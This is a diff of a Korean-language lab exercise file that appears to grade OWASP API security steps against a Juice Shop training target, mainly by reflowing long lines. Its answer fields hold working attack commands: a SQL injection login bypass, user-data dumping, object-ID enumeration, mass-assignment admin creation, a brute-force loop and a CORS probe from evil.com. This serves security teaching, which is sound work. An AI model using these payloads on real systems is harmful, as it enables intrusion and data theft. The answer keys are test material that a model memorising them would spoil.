@@ -17,8 +17,7 @@ steps:
   hint: curl로 /api/Products, /api/Users, /api/Feedbacks, /api/Challenges, /api/Recycles, /rest/products/search, /rest/user/login 등을 순차적으로 요청하세요.
   category: recon
   points: 8
-  answer: 'echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order;
-    do echo -n "/$EP: " && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''''; done && echo ''=== API Mapping Complete ==='''
+  answer: 'echo ''=== JuiceShop API Endpoint Map ==='' && for EP in api/Products api/Users api/Feedbacks api/Challenges api/Recycles api/SecurityQuestions rest/products/search rest/user/login rest/track-order; do echo -n "/$EP: " && curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000/$EP 2>/dev/null && echo ''''; done && echo ''=== API Mapping Complete ==='''
   answer_detail: API 엔드포인트 매핑은 API 보안 테스트의 기초입니다. 200(접근 가능), 401(인증 필요), 403(권한 부족), 404(미존재) 응답을 구분하여 공격 표면을 파악합니다. 인증 없이 200이 반환되는 엔드포인트가 첫 번째 공격 대상입니다.
   verify:
     type: output_contains
@@ -30,8 +29,7 @@ steps:
   hint: 인증 토큰 없이 curl http://10.20.30.80:3000/api/Users/ 를 요청하세요. 응답에 패스워드 해시, 이메일 등 민감 정보가 포함되는지 확인합니다.
   category: exploit
   points: 12
-  answer: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json; data=json.load(sys.stdin).get(''data'',[]); [print(f''User {u.get(\"id\")}: email={u.get(\"email\")}, role={u.get(\"role\",\"N/A\")}'')
-    for u in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500'
+  answer: 'curl -s http://10.20.30.80:3000/api/Users/ | python3 -c "import sys,json; data=json.load(sys.stdin).get(''data'',[]); [print(f''User {u.get(\"id\")}: email={u.get(\"email\")}, role={u.get(\"role\",\"N/A\")}'') for u in data[:5]]" 2>/dev/null || curl -s http://10.20.30.80:3000/api/Users/ | head -c 500'
   answer_detail: 'OWASP API #3 Excessive Data Exposure: API가 클라이언트가 필요한 것보다 많은 데이터를 반환합니다. 사용자 이메일, 패스워드 해시, createdAt 등의 민감 정보가 필터링 없이 노출되면, 공격자가 이를 크리덴셜 스터핑이나 소셜 엔지니어링에 활용할 수 있습니다.'
   verify:
     type: output_contains
@@ -43,8 +41,7 @@ steps:
   hint: SQL Injection으로 로그인한 후, Authorization 헤더로 다른 ID의 basket에 접근하세요.
   category: exploit
   points: 12
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
-    -f4) && for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization: Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && for i in 1 2 3; do echo "=== Basket $i ===" && curl -s http://10.20.30.80:3000/rest/basket/$i -H "Authorization: Bearer $TOKEN" -o /dev/null -w ''HTTP:%{http_code}'' && echo ''''; done'
   answer_detail: 'OWASP API #1 BOLA: API가 객체 수준의 권한 확인을 하지 않아, 다른 사용자의 리소스에 접근할 수 있습니다. basket/1, basket/2처럼 순차적 ID를 열거하면 모든 사용자의 장바구니를 조회할 수 있습니다.'
   verify:
     type: output_contains
@@ -56,9 +53,8 @@ steps:
   hint: POST /api/Users/ 에 {"email":"hacker@test.com","password":"test1234","role":"admin","isAdmin":true} 형태로 요청하세요.
   category: exploit
   points: 12
-  answer: 'curl -s -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"massassign_test@test.com","password":"hack1234","passwordRepeat":"hack1234","role":"admin","isAdmin":true}''
-    | python3 -c "import sys,json; d=json.load(sys.stdin).get(''data'',{}); print(f''id={d.get(\"id\")}, email={d.get(\"email\")}, role={d.get(\"role\",\"?\")}, isAdmin={d.get(\"isAdmin\",\"?\")}'')" 2>/dev/null
-    || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H ''Content-Type: application/json'' -d ''{"email":"massassign_test@test.com","password":"hack1234","passwordRepeat":"hack1234","role":"admin"}'''
+  answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' \\\n | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\
+    \"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null || curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"massassign_test@test.com\",\"password\":\"hack1234\",\"passwordRepeat\":\"hack1234\",\"role\":\"admin\"}'"
   answer_detail: 'OWASP API #6 Mass Assignment: 서버가 클라이언트 요청의 모든 필드를 그대로 모델에 바인딩하면, 공격자가 role, isAdmin 같은 숨겨진 필드를 추가하여 권한 상승을 할 수 있습니다. 응답에 role:admin이 반영되면 취약합니다.'
   verify:
     type: output_contains
@@ -70,8 +66,7 @@ steps:
   hint: for 루프로 curl -X POST /rest/user/login 에 잘못된 비밀번호를 반복 전송하세요.
   category: exploit
   points: 10
-  answer: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20); do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login
-    -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}'' && echo ''''; done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
+  answer: 'echo ''=== Rate Limiting Test (20 attempts) ==='' && for i in $(seq 1 20); do echo -n "Attempt $i: " && curl -s -o /dev/null -w ''%{http_code}'' -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"wrong_''"$i"''"}'' && echo ''''; done | tail -5 && echo ''=== Rate Limit Test Complete ==='''
   answer_detail: 'OWASP API #4 Lack of Resources & Rate Limiting: Rate Limiting이 없으면 브루트포스, 크리덴셜 스터핑 공격이 가능합니다. 20회 시도 후에도 429(Too Many Requests)가 발생하지 않으면 취약합니다.'
   verify:
     type: output_contains
@@ -83,8 +78,7 @@ steps:
   hint: curl -X GET/PUT/DELETE /api/Products/1 으로 각 메서드를 테스트하세요.
   category: exploit
   points: 12
-  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"''
-    -f4) && echo ''=== Function Level Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1: " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
+  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"'' | cut -d''"'' -f4) && echo ''=== Function Level Auth Test ==='' && for METHOD in GET PUT DELETE OPTIONS; do echo -n "$METHOD /api/Products/1: " && curl -s -o /dev/null -w ''%{http_code}'' -X $METHOD http://10.20.30.80:3000/api/Products/1
     -H ''Content-Type: application/json'' -H "Authorization: Bearer $TOKEN" && echo ''''; done && echo ''=== Auth Test Complete ==='''
   answer_detail: 'OWASP API #5 Broken Function Level Authorization: 서버가 HTTP 메서드별로 권한을 구분하지 않으면, GET은 허용하지만 PUT/DELETE도 허용될 수 있습니다. 관리자 전용 기능(사용자 수정/삭제)에 일반 사용자가 접근 가능하면 심각한 취약점입니다.'
   verify:
@@ -109,8 +103,7 @@ steps:
   hint: curl -I로 API 응답 헤더를 확인하세요. Access-Control-Allow-Origin이 *이면 모든 도메인에서 접근 가능합니다.
   category: defense
   points: 8
-  answer: 'echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/ | grep -iE ''(access-control|x-content|cache-control|x-frame|strict-transport|content-security)'' && echo
-    ''=== CORS Preflight ==='' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com'' -H ''Access-Control-Request-Method: DELETE'' | grep -iE ''(access-control|allow)''
+  answer: 'echo ''=== API Security Headers ==='' && curl -sI http://10.20.30.80:3000/api/Products/ | grep -iE ''(access-control|x-content|cache-control|x-frame|strict-transport|content-security)'' && echo ''=== CORS Preflight ==='' && curl -sI -X OPTIONS http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com'' -H ''Access-Control-Request-Method: DELETE'' | grep -iE ''(access-control|allow)''
     && echo ''=== Header Analysis Complete ==='''
   answer_detail: 'Access-Control-Allow-Origin: *는 모든 도메인에서 API를 호출할 수 있어 CSRF에 취약합니다. Cache-Control: no-store가 없으면 민감 데이터가 캐시됩니다. CORS는 허용 도메인을 명시적으로 지정해야 합니다.'
   verify:
@@ -123,8 +116,7 @@ steps:
   hint: curl로 각 경로에 접근하여 200 응답이 오는지 확인하세요.
   category: recon
   points: 8
-  answer: 'echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl -s -o /dev/null -w ''%{http_code}''
-    http://10.20.30.80:3000$PATH 2>/dev/null); echo "$PATH: $CODE"; done && echo ''=== Doc Scan Complete ==='''
+  answer: 'echo ''=== API Documentation Scan ==='' && for PATH in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json /v2/api-docs; do CODE=$(curl -s -o /dev/null -w ''%{http_code}'' http://10.20.30.80:3000$PATH 2>/dev/null); echo "$PATH: $CODE"; done && echo ''=== Doc Scan Complete ==='''
   answer_detail: API 문서(Swagger/OpenAPI)가 프로덕션에서 노출되면 모든 엔드포인트, 파라미터, 인증 방법이 공격자에게 노출됩니다. GraphQL introspection이 활성화되면 전체 스키마가 노출됩니다. 프로덕션에서는 반드시 비활성화해야 합니다.
   verify:
     type: output_contains
